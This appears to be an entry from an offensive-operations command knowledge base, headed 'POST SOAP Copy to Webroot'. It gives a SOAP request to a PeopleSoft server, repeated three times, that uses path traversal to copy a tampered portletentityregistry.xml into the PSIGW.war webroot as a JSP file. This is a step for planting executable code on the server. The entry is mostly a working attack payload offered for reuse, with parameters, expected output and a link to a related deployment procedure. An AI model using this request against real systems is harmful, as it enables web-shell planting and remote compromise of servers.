---
data: >-
  POST /pspc/services/lmJyaVBUrfcEfJw HTTP/1.1

  <?xml version="1.0" encoding="utf-8"?>

  <soapenv:Envelope ...>

  <soapenv:Body>

  <api:copy ...>

  <in0
  xsi:type="xsd:string">../../../../../../../../../../../../../../../../../../../../tmp/QAusGyxGqQqyVEhqzPbu/WEB-INF/data/portletentityregistry.xml</in0>

  <in1
  xsi:type="xsd:string">./applications/peoplesoft/PSIGW.war/PVrIiSDNAQlOQubhYHDE.jsp</in1>

  </api:copy>

  </soapenv:Body>

  </soapenv:Envelope>
tags:
  - soap
  - file-copy
type: command
executor: bash
platforms:
  - Linux
  - Web
id: b1e9dbe0-e62b-4796-98cd-faa7dc027ce9
created_at: '2025-12-13T09:00:28.136Z'
updated_at: '2025-12-13T09:00:28.136Z'
verified: false
validated: true
submitted: true
---
# POST SOAP Copy to Webroot

## Command

```bash
POST /pspc/services/lmJyaVBUrfcEfJw HTTP/1.1
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope ...>
<soapenv:Body>
<api:copy ...>
<in0 xsi:type="xsd:string">../../../../../../../../../../../../../../../../../../../../tmp/QAusGyxGqQqyVEhqzPbu/WEB-INF/data/portletentityregistry.xml</in0>
<in1 xsi:type="xsd:string">./applications/peoplesoft/PSIGW.war/PVrIiSDNAQlOQubhYHDE.jsp</in1>
</api:copy>
</soapenv:Body>
</soapenv:Envelope>
```

## Description

Copies modified XML to JSP file in webroot.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `in0` | Source path | Yes |
| `in1` | Destination JSP path | Yes |

## Examples

### Basic Usage

```bash
POST /pspc/services/lmJyaVBUrfcEfJw HTTP/1.1
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope ...>
<soapenv:Body>
<api:copy ...>
<in0 xsi:type="xsd:string">../../../../../../../../../../../../../../../../../../../../tmp/QAusGyxGqQqyVEhqzPbu/WEB-INF/data/portletentityregistry.xml</in0>
<in1 xsi:type="xsd:string">./applications/peoplesoft/PSIGW.war/PVrIiSDNAQlOQubhYHDE.jsp</in1>
</api:copy>
</soapenv:Body>
</soapenv:Envelope>
```

## Expected Output

File copied to webroot.

## Related

- [[procedures/Deploy-Modified-XML-to-Webroot-JSP]]
